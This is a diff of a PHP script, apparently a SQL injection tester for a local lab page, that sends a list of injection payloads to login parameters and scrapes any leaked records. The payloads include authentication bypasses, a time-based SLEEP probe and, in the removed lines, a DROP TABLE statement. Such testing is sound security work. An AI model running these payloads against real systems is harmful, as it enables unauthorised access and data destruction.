@@ -1,38 +1,61 @@
 <?php
-// URL della pagina vulnerabile
-$url_base = "http://localhost:8080/index.php";
+// sqli_test.php
 
-// Payload SQL Injection da testare
+$target = "http://localhost:8080/index.php"; // Modifica se necessario
+
 $payloads = [
-    "admin' OR '1'='1",
-    "admin' -- ",
-    "admin' UNION SELECT 1, 'hacker' -- ",
     "' OR '1'='1",
-    "' OR '1'='1' -- ",
-    "admin'; DROP TABLE users; -- "
+    "' OR 1=1-- ",
+    "' OR 'a'='a",
+    "' OR 1=1#",
+    "' OR ''='",
+    "' OR 1=1/*",
+    "admin' --",
+    "admin' #",
+    "admin'/*",
+    "' OR EXISTS(SELECT * FROM users)--",
+    "' OR SLEEP(5)--",
 ];
 
 foreach ($payloads as $payload) {
-    // Costruisci URL con parametro corretto "user"
-    $url = $url_base . "?user=" . urlencode($payload);
-    echo "Test payload: $payload\n";
-    echo "URL: $url\n";
+    $username = urlencode($payload);
+    $password = urlencode($payload);
 
-    // Inizializza cURL
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $url = "{$target}?username={$username}&password={$password}";
 
-    // Esegui richiesta
-    $response = curl_exec($ch);
+    echo "Testando payload: {$payload}\n";
+    $response = @file_get_contents($url);
 
-    if (curl_errno($ch)) {
-        echo "Errore cURL: " . curl_error($ch) . "\n";
-    } else {
-        // Mostra l'intera risposta (per debug completo)
-        echo "Risposta completa:\n";
-        echo $response . "\n";
+    if ($response === false) {
+        echo "Errore nella richiesta HTTP\n";
+        echo "-----------------------------\n";
+        continue;
     }
 
-    curl_close($ch);
-    echo str_repeat("-", 40) . "\n";
+    if (strpos($response, "ID:") !== false) {
+        echo ">>> VULNERABILITÀ TROVATA con payload: {$payload}\n";
+        // Estrai e mostra la parte dei dati trovati
+        preg_match_all('/<div class="error" class="result-item">(.*?)<\/div>/s', $response, $matches);
+        if (!empty($matches[1])) {
+            foreach ($matches[1] as $result) {
+                echo "Dati trovati:\n";
+                echo trim(strip_tags($result)) . "\n";
+            }
+        } else {
+            // In caso il pattern non funzioni, mostra tutta la risposta tra i tag <div class="error">
+            preg_match_all('/<div class="error".*?>(.*?)<\/div>/s', $response, $matches2);
+            foreach ($matches2[1] as $result) {
+                if (strpos($result, "Credenziali non valide") === false) {
+                    echo "Dati trovati:\n";
+                    echo trim(strip_tags($result)) . "\n";
+                }
+            }
+        }
+    } elseif (strpos($response, "Credenziali non valide") !== false) {
+        echo "Credenziali non valide (nessuna vulnerabilità rilevata con questo payload)\n";
+    } else {
+        echo "Risposta inaspettata o errore\n";
+    }
+    echo "-----------------------------\n";
 }
+?>
